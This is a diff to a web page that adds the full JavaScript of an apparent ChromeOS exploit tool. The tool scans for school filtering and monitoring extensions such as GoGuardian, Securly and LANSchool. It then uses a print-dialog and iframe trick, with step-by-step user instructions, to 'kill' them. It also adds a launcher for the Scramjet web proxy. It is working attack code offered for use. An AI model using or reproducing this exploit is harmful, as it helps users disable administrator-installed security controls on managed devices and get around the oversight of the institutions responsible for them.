@@ -145,6 +145,178 @@
     </div>
 </div>
 
-<script src="extprint3r-core.js"></script>
+<script>
+// ============ CHROME VERSION CHECK ============
+(function(){
+    var m=navigator.userAgent.match(/Chrome\/(\d+)/);
+    if(m&&parseInt(m[1])>=135){
+        var o=document.createElement('div');
+        o.style.cssText='position:fixed;top:0;left:0;width:100%;height:100%;background:#1e1f22;z-index:99999;display:flex;flex-direction:column;align-items:center;justify-content:center;';
+        o.innerHTML='<h3 style="color:white;margin-bottom:20px;">ChromeOS v135+ detected. This exploit may not work.</h3><button style="padding:12px 30px;background:#8ab4f8;color:#1e1f22;border:none;border-radius:25px;cursor:pointer;font-weight:600;" onclick="this.parentElement.remove()">Load Anyway</button>';
+        document.body.appendChild(o);
+    }
+})();
+
+// ============ TAB SWITCHING ============
+document.querySelectorAll('.option').forEach(function(b){
+    b.addEventListener('click',function(){
+        document.querySelectorAll('.tab-content').forEach(function(t){t.classList.remove('active')});
+        document.querySelectorAll('.option').forEach(function(o){o.classList.remove('selected')});
+        document.getElementById(this.getAttribute('data-name')).classList.add('active');
+        this.classList.add('selected');
+    });
+});
+
+// ============ SETTINGS ============
+document.getElementById('iframe-count').addEventListener('input',function(){
+    document.getElementById('iframe-count-display').textContent=this.value;
+});
+
+document.getElementById('developer-mode').addEventListener('change',function(){
+    if(this.checked){
+        if(!confirm('Enable Developer Mode? Advanced users only.')){this.checked=false;return}
+        document.getElementById('dev-settings').style.display='block';
+        document.getElementById('add-ext').onclick=function(){
+            var n=prompt('Extension Name:'),u=prompt('Frame URL:'),i=prompt('Icon URL (optional):');
+            if(n&&u)tryAddExtension(n,i||'',u).then(function(s){alert(s?'Added!':'Failed')});
+        };
+    }else{document.getElementById('dev-settings').style.display='none'}
+});
+
+document.getElementById('show-all-extensions').addEventListener('change',function(){
+    document.getElementById('div-container').innerHTML='';
+    loadExtensions();
+});
+
+// ============ EXTENSION DATABASE ============
+var extensions={
+    "Securly":"chrome-extension://iheobagjkfklnlikgihanlhcddjoihkg/fonts/Metropolis.css",
+    "GoGuardian":"chrome-extension://haldlgldplgnggkjaafhelgiaglafanh/icons/enabled-dark-128.png",
+    "LANSchool":"chrome-extension://baleiojnjpgeojohhhfbichcodgljmnj/blocked.html",
+    "Linewize":"chrome-extension://ddfbkhpmcdbciejenfcolaaiebnjcbfc/background/assets/pages/default-blocked.html",
+    "Blocksi":"chrome-extension://ghlpmldmjjhmdgmneoaibbegkjjbonbk/images/icons/yt-denied.png",
+    "FortiGuard":"chrome-extension://igbgpehnbmhgdgjbhkkpedommgmfbeao/youtube_injection.js",
+    "Cisco Umbrella":"chrome-extension://jcdhmojfecjfmbdpchihbeilohgnbdci/blocked.html",
+    "ContentKeeper":"chrome-extension://jdogphakondfdmcanpapfahkdomaicfa/img/ckauth19x.png",
+    "Hapara":"chrome-extension://aceopacgaepdcelohobicpffbbejnfac/blocked.html",
+    "iboss":"chrome-extension://kmffehbidlalibfeklaefnckpidbodff/restricted.html",
+    "Lightspeed Filter":"chrome-extension://adkcpkpghahmbopkjchobieckeoaoeem/blocked-image-search.png",
+    "Lightspeed Classroom":"chrome-extension://kkbmdgjggcdajckdlbngdjonpchpaiea/assets/icon-classroom-128.png"
+};
+
+var killCount=0,defaultIcon='data:image/svg+xml,'+encodeURIComponent('<svg xmlns="http://www.w3.org/2000/svg" width="36" height="36"><rect width="36" height="36" rx="8" fill="#38393b"/><text x="18" y="24" text-anchor="middle" fill="#8e918f" font-size="18">E</text></svg>');
+
+// ============ EXTENSION SCANNER ============
+function checkExtensionURL(u){
+    return fetch(u).then(function(r){return r.ok}).catch(function(){
+        return fetch(u,{method:'HEAD'}).then(function(r){return r.ok}).catch(function(){return false});
+    });
+}
+
+function getExtensionId(u){
+    var m=u.match(/^chrome-extension:\/\/([^\/]+)/);
+    return m?m[1]:'Unknown';
+}
+
+function tryAddExtension(n,i,u){
+    var s=document.getElementById('show-all-extensions').checked;
+    function add(){
+        var d=document.createElement('div');d.className='extension-container';
+        var dot=document.createElement('span');dot.className='extension-status';d.appendChild(dot);
+        var info=document.createElement('div');info.className='extension-info';
+        var img=document.createElement('img');img.src=i||defaultIcon;
+        info.appendChild(img);
+        var nm=document.createElement('span');nm.className='extension-name';nm.textContent=n;info.appendChild(nm);
+        var id=document.createElement('span');id.className='extension-id';id.textContent='ID: '+getExtensionId(u);
+        var btn=document.createElement('button');btn.textContent='Disable';
+        btn.onclick=function(){createPopup(n,img.src,u,getExtensionId(u))};
+        d.appendChild(btn);d.appendChild(id);d.appendChild(info);
+        document.getElementById('div-container').appendChild(d);
+        return true;
+    }
+    if(s)return Promise.resolve(add());
+    return checkExtensionURL(u).then(function(ok){if(ok)return add();return false});
+}
+
+function loadExtensions(){
+    var c=document.getElementById('div-container');c.innerHTML='';
+    var found=false;
+    var keys=Object.keys(extensions);
+    function processNext(idx){
+        if(idx>=keys.length){
+            document.getElementById('no-extensions').style.display=found?'none':'block';
+            if(found)document.getElementById('kill-counter').style.display='inline-block';
+            return;
+        }
+        tryAddExtension(keys[idx],'',extensions[keys[idx]]).then(function(r){
+            if(r)found=true;
+            processNext(idx+1);
+        });
+    }
+    processNext(0);
+}
+
+// ============ THE PRINT3R EXPLOIT ============
+function createIframesAndPrint(extPage,extIcon){
+    var w=window.open('','_blank');
+    w.document.title='The Print3r';
+    w.document.body.style.backgroundColor='#1e1f22';
+    w.document.body.innerHTML='<div id="ld" style="position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);color:white;font-size:20px;text-align:center;"><div style="border:4px solid rgba(255,255,255,0.3);border-top:4px solid white;border-radius:50%;width:40px;height:40px;animation:spin 1s linear infinite;margin:0 auto 10px;"></div>Loading...</div><style>@keyframes spin{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}</style>';
+    var sc=w.document.createElement('script');sc.text='setTimeout(function(){window.close()},5000)';w.document.body.appendChild(sc);
+    setTimeout(function(){
+        var n=parseInt(document.getElementById('iframe-count').value);
+        for(var i=0;i<n;i++){
+            var f=document.createElement('iframe');f.src=extPage;f.width='25';f.height='25';f.style.border='none';
+            w.document.body.appendChild(f);
+        }
+        var ld=w.document.getElementById('ld');if(ld)ld.remove();
+        w.print();
+        killCount++;
+        document.getElementById('kill-counter').textContent=killCount+' Killed';
+        document.getElementById('kill-counter').style.display='inline-block';
+    },1000);
+}
+
+// ============ POPUP MODAL ============
+function createPopup(extName,extIcon,extPage,extId){
+    var ov=document.createElement('div');ov.className='modal-overlay';
+    ov.innerHTML='<div class="modal"><div class="modal-header"><span>💀 '+extName+'</span><span class="close-btn">&times;</span></div><div class="modal-body"><p>Open this URL in a new tab:</p><span class="url-highlight">chrome://extensions?id='+extId+'</span><p style="margin-top:12px;">Come back and click <b>The Print3r</b>. When popup opens, press <b>Ctrl+Tab</b> and spam <b>"Allow Access to file URLs"</b> for ~5 seconds. Close that tab, return to printer window, press <b>Cancel</b> on print dialog.</p><p style="margin-top:12px;color:#8ab4f8;">If done right, <b>'+extName+'</b> will be killed.</p></div><div class="modal-footer"><button id="pb">⚡ The Print3r</button></div></div>';
+    document.body.appendChild(ov);
+    ov.querySelector('.close-btn').onclick=function(){ov.remove()};
+    ov.onclick=function(e){if(e.target===ov)ov.remove()};
+    ov.querySelector('#pb').onclick=function(){
+        createIframesAndPrint(extPage,extIcon);
+        setTimeout(function(){
+            ov.querySelector('.modal-body').innerHTML='<p style="text-align:center;font-size:18px;color:#4caf50;">✅ '+extName+' has been killed!</p>';
+            ov.querySelector('.modal-footer').remove();
+        },500);
+    };
+}
+
+// ============ SCRAMJET LAUNCHER ============
+function launchScramjet(){
+    var u=document.getElementById('scramjet-url').value;
+    var s=document.getElementById('scramjet-server').value;
+    if(!u)return alert('Enter a URL first');
+    window.open(s+'/service/'+encodeURIComponent(u),'_blank');
+}
+
+// ============ CONTRIBUTORS ============
+function loadContributors(){
+    fetch('https://api.github.com/repos/Blobby-Boi/ExtPrint3r/contributors').then(function(r){return r.json()}).then(function(c){
+        var l=document.getElementById('contributor-list');
+        c.forEach(function(x){
+            var a=document.createElement('a');a.href=x.html_url;a.target='_blank';a.style.display='inline-block';
+            var img=document.createElement('img');img.src=x.avatar_url;
+            img.style.cssText='width:45px;height:45px;border-radius:50%;border:2px solid #444;';img.title=x.login;
+            a.appendChild(img);l.appendChild(a);
+        });
+    }).catch(function(){});
+}
+
+// ============ INIT ============
+loadExtensions();
+loadContributors();
+</script>
 </body>
 </html>
